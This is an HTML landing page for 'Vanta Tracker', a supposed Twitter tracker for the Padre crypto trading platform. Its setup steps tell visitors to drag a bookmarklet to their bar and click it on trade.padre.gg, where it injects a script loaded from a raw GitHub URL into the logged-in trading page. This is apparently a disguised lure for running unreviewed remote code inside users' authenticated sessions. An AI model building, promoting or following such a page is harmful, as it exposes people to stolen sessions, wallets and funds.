<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ff88; --bg-dark: #0a0a0a; --text-muted: #aaaaaa; }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: #e0e0e0; margin: 0; overflow-x: hidden; }
        header { text-align: center; padding: 100px 20px; border-bottom: 2px solid var(--primary); background: linear-gradient(135deg, #000, #001a0d); }
        h1 { color: var(--primary); font-size: 3.5em; text-shadow: 0 0 15px rgba(0,255,136,0.5); }
        .cta-button { display: inline-block; background: var(--primary); color: #000; padding: 16px 36px; text-decoration: none; border-radius: 8px; font-weight: 800; margin-top: 20px; transition: 0.3s; box-shadow: 0 0 20px rgba(0,255,136,0.4); }
        .cta-button:hover { transform: translateY(-5px); box-shadow: 0 0 30px var(--primary); }
        .setup-section { padding: 80px 20px; text-align: center; max-width: 800px; margin: 0 auto; }
        ol { text-align: left; color: var(--text-muted); line-height: 2; }
        #vanta-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.4; }
    </style>
</head>
<body>
    <canvas id="vanta-canvas"></canvas>
    <header>
        <h1>Vanta Tracker</h1>
        <p>Advanced Twitter API tracking optimized for Padre workflows.</p>
    </header>

    <section class="setup-section">
        <h2>Setup Instructions</h2>
        <ol>
            <li>Ensure your Bookmarks Bar is visible (Ctrl+Shift+B).</li>
            <li>Drag the "Vanta Tracker" button below to your bar.</li>
            <li>Navigate to trade.padre.gg and click the bookmark to activate.</li>
        </ol>

        <a href="javascript:(function(){var s=document.createElement('script');s.src='https://raw.githubusercontent.com/Vanta-Dev-Pages/Vanta/Vanta/engine.js';document.head.appendChild(s);})();" class="cta-button">
            Vanta Tracker
        </a>
    </section>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
    <script>
        VANTA.NET({ el: "#vanta-canvas", color: 0x00ff88, backgroundColor: 0x0a0a0a, points: 12 });
    </script>
</body>
</html>
